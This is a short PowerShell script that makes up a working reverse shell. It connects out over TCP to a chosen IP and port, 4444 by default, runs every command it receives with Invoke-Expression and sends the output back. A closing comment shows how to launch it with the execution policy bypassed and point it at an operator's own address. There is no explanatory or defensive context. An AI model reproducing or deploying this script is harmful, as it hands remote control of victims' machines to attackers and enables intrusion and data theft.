param(
    [string]$ip = "127.0.0.1",
    [int]$port = 4444
)

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()

$writer = new-object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true

$reader = new-object System.IO.StreamReader($stream)

while($true) {
    $cmd = $reader.ReadLine()
    $output = Invoke-Expression $cmd
    $writer.WriteLine($output)
}

$client.Close()
# powershell.exe -ExecutionPolicy Bypass -File yourscript.ps1 -ip <your_ip> -port <your_port>
